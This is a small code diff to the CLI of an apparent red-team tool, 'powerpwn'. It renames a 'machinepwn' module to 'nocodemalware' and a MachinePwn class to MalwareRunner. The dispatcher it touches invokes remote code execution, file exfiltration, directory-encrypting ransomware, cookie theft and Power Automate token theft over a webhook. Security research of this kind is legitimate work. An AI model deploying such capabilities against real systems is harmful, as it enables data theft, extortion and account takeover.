@@ -4,9 +4,9 @@ import os
 import shutil
 
 from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
-from powerpwn.machinepwn.enums.command_to_run_enum import CommandToRunEnum
-from powerpwn.machinepwn.machine_pwn import MachinePwn
+from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
+from powerpwn.nocodemalware.enums.command_to_run_enum import CommandToRunEnum
+from powerpwn.nocodemalware.malware_runner import MalwareRunner
 from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
 from powerpwn.powerdoor.enums.action_type import BackdoorActionType
 from powerpwn.powerdoor.flow_factory_installer import FlowFlowInstaller
@@ -88,21 +88,21 @@ def run_backdoor_flow_command(args):
 
 
 def run_nocodemalware_command(args):
-    machine_pwn = MachinePwn(args.webhook_url)
+    malware_runner = MalwareRunner(args.webhook_url)
 
     command_type = CommandToRunEnum(args.nocodemalware_subcommand)
     if command_type == CommandToRunEnum.CLEANUP:
-        res = machine_pwn.cleanup()
+        res = malware_runner.cleanup()
     elif command_type == CommandToRunEnum.CODE_EXEC:
-        res = machine_pwn.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
+        res = malware_runner.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
     elif command_type == CommandToRunEnum.EXFILTRATION:
-        res = machine_pwn.exfiltrate(args.file)
+        res = malware_runner.exfiltrate(args.file)
     elif command_type == CommandToRunEnum.RANSOMWARE:
-        res = machine_pwn.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
+        res = malware_runner.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
     elif command_type == CommandToRunEnum.STEAL_COOKIE:
-        res = machine_pwn.steal_cookie(args.cookie)
+        res = malware_runner.steal_cookie(args.cookie)
     elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
-        res = machine_pwn.steal_power_automate_token()
+        res = malware_runner.steal_power_automate_token()
     print(res)
 
 
